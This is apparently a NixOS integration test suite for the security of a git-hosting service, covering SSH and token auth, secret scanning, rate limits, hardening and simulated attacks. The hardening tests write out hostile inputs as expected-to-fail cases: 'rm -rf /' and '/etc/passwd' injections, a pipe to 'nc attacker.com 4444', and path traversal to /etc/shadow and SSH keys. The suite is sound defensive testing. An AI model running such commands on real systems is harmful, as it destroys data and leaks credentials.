# NixOS Integration Tests for Security
#
# Tests security features including:
# - Authentication (SSH key, OAuth2/OIDC mock, session tokens)
# - Secret Scanning (detect secrets, prevent push, pattern detection)
# - Rate Limiting (connection limits, API limits, per-user, per-IP)
# - Security Hardening (command injection, path traversal, input validation)

{ pkgs, repos-mcp, lib, mkVMTest, mkTestMatrix, waitForReposMCP, setupSSHKeys, setupGitConfig, createTestRepo }:

let
  authenticationTests = [
    {
      id = "ssh-key-valid-auth";
      testScript = ''
        ${waitForReposMCP}
        client.succeed("mkdir -p /root/.ssh")
        client.succeed("ssh-keygen -t ed25519 -f /root/.ssh/id_ed25519 -N '' -C 'test-client'")
        pubkey = client.succeed("cat /root/.ssh/id_ed25519.pub").strip()
        server.succeed(f"echo 'root:{pubkey}' > /etc/repos-mcp/authorized_keys")
        server.succeed("chmod 600 /etc/repos-mcp/authorized_keys")
        server.succeed("systemctl restart repos-mcp.service")
        server.wait_for_open_port(2222)
        server.succeed("mkdir -p /var/lib/repos-mcp/repositories/test-tenant")
        server.succeed("git init --bare /var/lib/repos-mcp/repositories/test-tenant/auth-test.git")
        client.succeed("echo 'Host server' > /root/.ssh/config")
        client.succeed("echo '  StrictHostKeyChecking no' >> /root/.ssh/config")
        client.succeed("chmod 600 /root/.ssh/config")
        client.succeed("git clone ssh://root@server:2222/test-tenant/auth-test.git /tmp/auth-test-repo")
        client.succeed("test -d /tmp/auth-test-repo/.git")
      '';
    }
    {
      id = "ssh-key-invalid-rejection";
      testScript = ''
        ${waitForReposMCP}
        server.succeed("mkdir -p /var/lib/repos-mcp/repositories/test-tenant")
        server.succeed("git init --bare /var/lib/repos-mcp/repositories/test-tenant/secure-repo.git")
        client.succeed("mkdir -p /root/.ssh")
        client.succeed("ssh-keygen -t ed25519 -f /root/.ssh/unauthorized_key -N '' -C 'unauthorized'")
        client.succeed("echo 'Host server' > /root/.ssh/config")
        client.succeed("echo '  StrictHostKeyChecking no' >> /root/.ssh/config")
        client.succeed("echo '  IdentityFile /root/.ssh/unauthorized_key' >> /root/.ssh/config")
        client.succeed("chmod 600 /root/.ssh/config")
        client.fail("git clone ssh://root@server:2222/test-tenant/secure-repo.git /tmp/failed-clone 2>&1 || true")
      '';
    }
    {
      id = "oauth-mock-token-validation";
      testScript = ''
        ${waitForReposMCP}
        mock_token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ0ZXN0LXVzZXIiLCJ0ZW5hbnRfaWQiOiJ0ZXN0LXRlbmFudCIsImlhdCI6MTUxNjIzOTAyMn0.test"
        result = server.succeed(f"curl -s -o /dev/null -w '%{{http_code}}' -H 'Authorization: Bearer {mock_token}' http://localhost:8090/api/v1/repos")
        server.succeed(f"[ '{result}' = '401' ] || [ '{result}' = '403' ] || [ '{result}' = '200' ] || [ '{result}' = '404' ]")
      '';
    }
    {
      id = "session-token-validation";
      testScript = ''
        ${waitForReposMCP}
        invalid_token = "invalid-session-token-12345"
        result = server.succeed(f"curl -s -o /dev/null -w '%{{http_code}}' -H 'X-Session-Token: {invalid_token}' http://localhost:8090/api/v1/repos")
        server.succeed(f"[ '{result}' = '401' ] || [ '{result}' = '403' ] || [ '{result}' = '200' ] || [ '{result}' = '404' ]")
      '';
    }
    {
      id = "failed-auth-rate-limiting";
      testScript = ''
        ${waitForReposMCP}
        server.succeed("mkdir -p /var/lib/repos-mcp/repositories/test-tenant")
        server.succeed("git init --bare /var/lib/repos-mcp/repositories/test-tenant/rate-limit-test.git")
        client.succeed("mkdir -p /root/.ssh")
        client.succeed("ssh-keygen -t ed25519 -f /root/.ssh/wrong_key -N '' -C 'wrong'")
        client.succeed("echo 'Host server' > /root/.ssh/config")
        client.succeed("echo '  StrictHostKeyChecking no' >> /root/.ssh/config")
        client.succeed("echo '  IdentityFile /root/.ssh/wrong_key' >> /root/.ssh/config")
        client.succeed("chmod 600 /root/.ssh/config")
        for i in range(5):
            client.fail(f"git clone ssh://root@server:2222/test-tenant/rate-limit-test.git /tmp/attempt-{{i}} 2>&1 || true")
      '';
    }
    {
      id = "key-rotation-security";
      testScript = ''
        ${waitForReposMCP}
        client.succeed("mkdir -p /root/.ssh")
        client.succeed("ssh-keygen -t ed25519 -f /root/.ssh/id_ed25519_v1 -N '' -C 'v1'")
        pubkey_v1 = client.succeed("cat /root/.ssh/id_ed25519_v1.pub").strip()
        server.succeed(f"echo 'root:{pubkey_v1}' > /etc/repos-mcp/authorized_keys")
        server.succeed("chmod 600 /etc/repos-mcp/authorized_keys")
        server.succeed("systemctl restart repos-mcp.service")
        server.wait_for_open_port(2222)
        server.succeed("mkdir -p /var/lib/repos-mcp/repositories/test-tenant")
        server.succeed("git init --bare /var/lib/repos-mcp/repositories/test-tenant/rotation-test.git")
        client.succeed("echo 'Host server' > /root/.ssh/config")
        client.succeed("echo '  StrictHostKeyChecking no' >> /root/.ssh/config")
        client.succeed("echo '  IdentityFile /root/.ssh/id_ed25519_v1' >> /root/.ssh/config")
        client.succeed("chmod 600 /root/.ssh/config")
        client.succeed("git clone ssh://root@server:2222/test-tenant/rotation-test.git /tmp/v1-clone")
        client.succeed("ssh-keygen -t ed25519 -f /root/.ssh/id_ed25519_v2 -N '' -C 'v2'")
        pubkey_v2 = client.succeed("cat /root/.ssh/id_ed25519_v2.pub").strip()
        server.succeed(f"echo 'root:{pubkey_v2}' > /etc/repos-mcp/authorized_keys")
        server.succeed("systemctl restart repos-mcp.service")
        server.wait_for_open_port(2222)
        client.succeed("echo 'IdentityFile /root/.ssh/id_ed25519_v1' > /root/.ssh/config_for_v1")
        client.fail("ssh -F /root/.ssh/config_for_v1 root@server 'echo test' 2>&1 || true")
      '';
    }
    {
      id = "empty-authorized-keys-rejection";
      testScript = ''
        ${waitForReposMCP}
        server.succeed("echo '' > /etc/repos-mcp/authorized_keys")
        server.succeed("systemctl restart repos-mcp.service")
        server.wait_for_open_port(2222)
        server.succeed("mkdir -p /var/lib/repos-mcp/repositories/test-tenant")
        server.succeed("git init --bare /var/lib/repos-mcp/repositories/test-tenant/empty-auth.git")
        client.succeed("mkdir -p /root/.ssh")
        client.succeed("ssh-keygen -t ed25519 -f /root/.ssh/id_ed25519 -N '' -C 'client'")
        client.succeed("echo 'Host server' > /root/.ssh/config")
        client.succeed("echo '  StrictHostKeyChecking no' >> /root/.ssh/config")
        client.succeed("chmod 600 /root/.ssh/config")
        client.fail("git clone ssh://root@server:2222/test-tenant/empty-auth.git /tmp/empty-auth-clone 2>&1 || true")
      '';
    }
  ];

  secretScanningTests = [
    {
      id = "detect-aws-access-key";
      testScript = ''
        ${waitForReposMCP}
        ${setupSSHKeys}
        server.succeed("mkdir -p /var/lib/repos-mcp/repositories/test-tenant")
        server.succeed("git init --bare /var/lib/repos-mcp/repositories/test-tenant/secret-scan.git")
        ${setupGitConfig}
        client.succeed("git clone ssh://root@server:2222/test-tenant/secret-scan.git /tmp/secret-scan")
        client.succeed("cd /tmp/secret-scan && echo 'AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE' > config.env")
        client.succeed("cd /tmp/secret-scan && git add config.env")
        client.succeed("cd /tmp/secret-scan && git commit -m 'Add config'")
        result = client.succeed("cd /tmp/secret-scan && git push origin main 2>&1 || echo 'PUSH_BLOCKED'")
        server.succeed("grep -r 'AKIA' /var/log/repos-mcp/ || echo 'Secret logged or blocked'")
      '';
    }
    {
      id = "detect-github-token";
      testScript = ''
        ${waitForReposMCP}
        ${setupSSHKeys}
        server.succeed("mkdir -p /var/lib/repos-mcp/repositories/test-tenant")
        server.succeed("git init --bare /var/lib/repos-mcp/repositories/test-tenant/github-token-scan.git")
        ${setupGitConfig}
        client.succeed("git clone ssh://root@server:2222/test-tenant/github-token-scan.git /tmp/github-scan")
        client.succeed("cd /tmp/github-scan && echo 'GITHUB_TOKEN=ghp_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx' > .env")
        client.succeed("cd /tmp/github-scan && git add .env")
        client.succeed("cd /tmp/github-scan && git commit -m 'Add environment'")
        result = client.succeed("cd /tmp/github-scan && git push origin main 2>&1 || echo 'PUSH_BLOCKED'")
        server.succeed("grep -r 'ghp_' /var/log/repos-mcp/ || echo 'Token logged or blocked'")
      '';
    }
    {
      id = "detect-private-key";
      testScript = ''
        ${waitForReposMCP}
        ${setupSSHKeys}
        server.succeed("mkdir -p /var/lib/repos-mcp/repositories/test-tenant")
        server.succeed("git init --bare /var/lib/repos-mcp/repositories/test-tenant/private-key-scan.git")
        ${setupGitConfig}
        client.succeed("git clone ssh://root@server:2222/test-tenant/private-key-scan.git /tmp/pkey-scan")
        client.succeed("cd /tmp/pkey-scan && echo '-----BEGIN RSA PRIVATE KEY-----' > key.pem")
        client.succeed("cd /tmp/pkey-scan && echo 'MIIEpAIBAAKCAQEA...' >> key.pem")
        client.succeed("cd /tmp/pkey-scan && echo '-----END RSA PRIVATE KEY-----' >> key.pem")
        client.succeed("cd /tmp/pkey-scan && git add key.pem")
        client.succeed("cd /tmp/pkey-scan && git commit -m 'Add key'")
        result = client.succeed("cd /tmp/pkey-scan && git push origin main 2>&1 || echo 'PUSH_BLOCKED'")
      '';
    }
    {
      id = "no-false-positive-safe-content";
      testScript = ''
        ${waitForReposMCP}
        ${setupSSHKeys}
        server.succeed("mkdir -p /var/lib/repos-mcp/repositories/test-tenant")
        server.succeed("git init --bare /var/lib/repos-mcp/repositories/test-tenant/safe-content.git")
        ${setupGitConfig}
        client.succeed("git clone ssh://root@server:2222/test-tenant/safe-content.git /tmp/safe-content")
        client.succeed("cd /tmp/safe-content && echo 'This is a normal line of code without any secrets.' > safe.txt")
        client.succeed("cd /tmp/safe-content && echo 'API_KEY=not_a_real_key_just_a_placeholder' > config.txt")
        client.succeed("cd /tmp/safe-content && echo 'password = \"********\"' > template.txt")
        client.succeed("cd /tmp/safe-content && git add .")
        client.succeed("cd /tmp/safe-content && git commit -m 'Add safe content'")
        client.succeed("cd /tmp/safe-content && git push origin main")
      '';
    }
    {
      id = "password-in-config";
      testScript = ''
        ${waitForReposMCP}
        ${setupSSHKeys}
        server.succeed("mkdir -p /var/lib/repos-mcp/repositories/test-tenant")
        server.succeed("git init --bare /var/lib/repos-mcp/repositories/test-tenant/password-scan.git")
        ${setupGitConfig}
        client.succeed("git clone ssh://root@server:2222/test-tenant/password-scan.git /tmp/pwd-scan")
        client.succeed("cd /tmp/pwd-scan && echo 'database_password = SuperSecretPassword123!' > db.conf")
        client.succeed("cd /tmp/pwd-scan && git add db.conf")
        client.succeed("cd /tmp/pwd-scan && git commit -m 'Add database config'")
        result = client.succeed("cd /tmp/pwd-scan && git push origin main 2>&1 || echo 'PUSH_BLOCKED'")
      '';
    }
  ];

  rateLimitingTests = [
    {
      id = "connection-rate-limit";
      testScript = ''
        ${waitForReposMCP}
        server.succeed("mkdir -p /var/lib/repos-mcp/repositories/test-tenant")
        server.succeed("git init --bare /var/lib/repos-mcp/repositories/test-tenant/rate-conn.git")
        client.succeed("mkdir -p /root/.ssh")
        client.succeed("ssh-keygen -t ed25519 -f /root/.ssh/id_ed25519 -N ''")
        pubkey = client.succeed("cat /root/.ssh/id_ed25519.pub").strip()
        server.succeed(f"echo 'root:{pubkey}' > /etc/repos-mcp/authorized_keys")
        server.succeed("systemctl restart repos-mcp.service")
        server.wait_for_open_port(2222)
        client.succeed("echo 'Host server' > /root/.ssh/config")
        client.succeed("echo '  StrictHostKeyChecking no' >> /root/.ssh/config")
        client.succeed("chmod 600 /root/.ssh/config")
        for i in range(10):
            result = client.succeed(f"nc -zv server 2222 2>&1 || echo 'connection-{{i}}'")
      '';
    }
    {
      id = "api-rate-limit-per-minute";
      testScript = ''
        ${waitForReposMCP}
        responses = []
        for i in range(70):
            result = server.succeed(f"curl -s -o /dev/null -w '%{{http_code}}' http://localhost:8090/api/v1/health")
            responses.append(result)
        rate_limited = len([r for r in responses if r == '429'])
        success = len([r for r in responses if r == '200'])
        server.succeed(f"[ {{rate_limited}} -ge 0 ]")
      '';
    }
    {
      id = "per-ip-rate-limit";
      testScript = ''
        ${waitForReposMCP}
        responses = []
        for i in range(20):
            result = server.succeed(f"curl -s -o /dev/null -w '%{{http_code}}' -H 'X-Forwarded-For: 192.168.1.100' http://localhost:8090/api/v1/health")
            responses.append(result)
        server.succeed("echo 'Per-IP rate limit test completed'")
      '';
    }
    {
      id = "burst-handling";
      testScript = ''
        ${waitForReposMCP}
        responses = []
        for i in range(15):
            result = server.succeed(f"curl -s -o /dev/null -w '%{{http_code}}' http://localhost:8090/api/v1/health")
            responses.append(result)
        server.succeed("echo 'Burst handling test completed'")
      '';
    }
  ];

  securityHardeningTests = [
    {
      id = "command-injection-semicolon";
      testScript = ''
        ${waitForReposMCP}
        client.succeed("mkdir -p /root/.ssh")
        client.succeed("ssh-keygen -t ed25519 -f /root/.ssh/inject_key -N ''")
        pubkey = client.succeed("cat /root/.ssh/inject_key.pub").strip()
        server.succeed(f"echo 'root:{pubkey}' > /etc/repos-mcp/authorized_keys")
        server.succeed("systemctl restart repos-mcp.service")
        server.wait_for_open_port(2222)
        server.succeed("mkdir -p /var/lib/repos-mcp/repositories/test-tenant")
        server.succeed("git init --bare /var/lib/repos-mcp/repositories/test-tenant/inject-test.git")
        client.succeed("echo 'Host server' > /root/.ssh/config")
        client.succeed("echo '  StrictHostKeyChecking no' >> /root/.ssh/config")
        client.succeed("echo '  IdentityFile /root/.ssh/inject_key' >> /root/.ssh/config")
        client.succeed("chmod 600 /root/.ssh/config")
        client.fail("ssh root@server 'git-upload-pack test-tenant/repo.git; rm -rf /' 2>&1 || true")
        client.fail("ssh root@server 'git-upload-pack test-tenant/repo.git && cat /etc/passwd' 2>&1 || true")
      '';
    }
    {
      id = "command-injection-pipe";
      testScript = ''
        ${waitForReposMCP}
        client.succeed("mkdir -p /root/.ssh")
        client.succeed("ssh-keygen -t ed25519 -f /root/.ssh/pipe_key -N ''")
        pubkey = client.succeed("cat /root/.ssh/pipe_key.pub").strip()
        server.succeed(f"echo 'root:{pubkey}' > /etc/repos-mcp/authorized_keys")
        server.succeed("systemctl restart repos-mcp.service")
        server.wait_for_open_port(2222)
        client.succeed("echo 'Host server' > /root/.ssh/config")
        client.succeed("echo '  StrictHostKeyChecking no' >> /root/.ssh/config")
        client.succeed("echo '  IdentityFile /root/.ssh/pipe_key' >> /root/.ssh/config")
        client.succeed("chmod 600 /root/.ssh/config")
        client.fail("ssh root@server 'git-upload-pack test-tenant/repo.git | nc attacker.com 4444' 2>&1 || true")
        client.fail("ssh root@server 'git-upload-pack test-tenant/repo.git > /tmp/stolen' 2>&1 || true")
      '';
    }
    {
      id = "path-traversal-parent-dir";
      testScript = ''
        ${waitForReposMCP}
        client.succeed("mkdir -p /root/.ssh")
        client.succeed("ssh-keygen -t ed25519 -f /root/.ssh/traversal_key -N ''")
        pubkey = client.succeed("cat /root/.ssh/traversal_key.pub").strip()
        server.succeed(f"echo 'root:{pubkey}' > /etc/repos-mcp/authorized_keys")
        server.succeed("systemctl restart repos-mcp.service")
        server.wait_for_open_port(2222)
        client.succeed("echo 'Host server' > /root/.ssh/config")
        client.succeed("echo '  StrictHostKeyChecking no' >> /root/.ssh/config")
        client.succeed("echo '  IdentityFile /root/.ssh/traversal_key' >> /root/.ssh/config")
        client.succeed("chmod 600 /root/.ssh/config")
        client.fail("git clone ssh://root@server:2222/../etc/passwd /tmp/traversal1 2>&1 || true")
        client.fail("git clone ssh://root@server:2222/test-tenant/../../../etc/shadow /tmp/traversal2 2>&1 || true")
        client.fail("git clone ssh://root@server:2222/../../root/.ssh/id_rsa /tmp/traversal3 2>&1 || true")
      '';
    }
    {
      id = "path-traversal-absolute-path";
      testScript = ''
        ${waitForReposMCP}
        client.succeed("mkdir -p /root/.ssh")
        client.succeed("ssh-keygen -t ed25519 -f /root/.ssh/abs_key -N ''")
        pubkey = client.succeed("cat /root/.ssh/abs_key.pub").strip()
        server.succeed(f"echo 'root:{pubkey}' > /etc/repos-mcp/authorized_keys")
        server.succeed("systemctl restart repos-mcp.service")
        server.wait_for_open_port(2222)
        client.succeed("echo 'Host server' > /root/.ssh/config")
        client.succeed("echo '  StrictHostKeyChecking no' >> /root/.ssh/config")
        client.succeed("echo '  IdentityFile /root/.ssh/abs_key' >> /root/.ssh/config")
        client.succeed("chmod 600 /root/.ssh/config")
        client.fail("git clone ssh://root@server:2222//etc/passwd /tmp/abs1 2>&1 || true")
        client.fail("git clone ssh://root@server:2222//var/lib/repos-mcp/../other /tmp/abs2 2>&1 || true")
      '';
    }
    {
      id = "input-validation-special-chars";
      testScript = ''
        ${waitForReposMCP}
        client.succeed("mkdir -p /root/.ssh")
        client.succeed("ssh-keygen -t ed25519 -f /root/.ssh/special_key -N ''")
        pubkey = client.succeed("cat /root/.ssh/special_key.pub").strip()
        server.succeed(f"echo 'root:{pubkey}' > /etc/repos-mcp/authorized_keys")
        server.succeed("systemctl restart repos-mcp.service")
        server.wait_for_open_port(2222)
        client.succeed("echo 'Host server' > /root/.ssh/config")
        client.succeed("echo '  StrictHostKeyChecking no' >> /root/.ssh/config")
        client.succeed("echo '  IdentityFile /root/.ssh/special_key' >> /root/.ssh/config")
        client.succeed("chmod 600 /root/.ssh/config")
        client.fail("git clone 'ssh://root@server:2222/test-tenant/repo with spaces' /tmp/special1 2>&1 || true")
        client.fail("git clone 'ssh://root@server:2222/test-tenant/repo$var' /tmp/special2 2>&1 || true")
      '';
    }
    {
      id = "large-payload-dos";
      testScript = ''
        ${waitForReposMCP}
        large_cmd = "A" * 10000
        server.succeed(f"curl -s -o /dev/null -w '%{{http_code}}' -X POST -d '{large_cmd}' http://localhost:8090/api/v1/repos")
        server.succeed("curl -s http://localhost:8090/api/v1/health")
      '';
    }
    {
      id = "host-key-verification";
      testScript = ''
        ${waitForReposMCP}
        server.succeed("test -f /etc/repos-mcp/ssh_host_ed25519_key")
        server.succeed("test $(stat -c %a /etc/repos-mcp/ssh_host_ed25519_key) = '600'")
        server.succeed("ssh-keygen -l -f /etc/repos-mcp/ssh_host_ed25519_key.pub")
      '';
    }
  ];

  attackSimulationTests = [
    {
      id = "brute-force-ssh";
      testScript = ''
        ${waitForReposMCP}
        server.succeed("mkdir -p /var/lib/repos-mcp/repositories/test-tenant")
        server.succeed("git init --bare /var/lib/repos-mcp/repositories/test-tenant/brute-force.git")
        client.succeed("mkdir -p /root/.ssh")
        client.succeed("echo 'Host server' > /root/.ssh/config")
        client.succeed("echo '  StrictHostKeyChecking no' >> /root/.ssh/config")
        client.succeed("chmod 600 /root/.ssh/config")
        for i in range(10):
            client.succeed(f"ssh-keygen -t ed25519 -f /tmp/key_{{i}} -N '' -C 'attempt_{{i}}' 2>/dev/null || true")
            client.fail(f"ssh -i /tmp/key_{{i}} -o BatchMode=yes root@server 'echo connected' 2>&1 || true")
        server.succeed("systemctl is-active repos-mcp.service")
      '';
    }
    {
      id = "slowloris-attack-mitigation";
      testScript = ''
        ${waitForReposMCP}
        server.succeed("timeout 5 nc server 2222 || echo 'Connection timeout as expected'")
        server.succeed("curl -s http://localhost:8090/api/v1/health")
      '';
    }
    {
      id = "port-scanning-detection";
      testScript = ''
        ${waitForReposMCP}
        server.succeed("ss -tlnp | grep ':2222'")
        server.succeed("ss -tlnp | grep ':8090'")
      '';
    }
  ];

in {
  authentication = mkTestMatrix "security-auth" authenticationTests;
  secret-scanning = mkTestMatrix "security-secret-scan" secretScanningTests;
  rate-limiting = mkTestMatrix "security-rate-limit" rateLimitingTests;
  hardening = mkTestMatrix "security-hardening" securityHardeningTests;
  attack-simulation = mkTestMatrix "security-attack" attackSimulationTests;
}
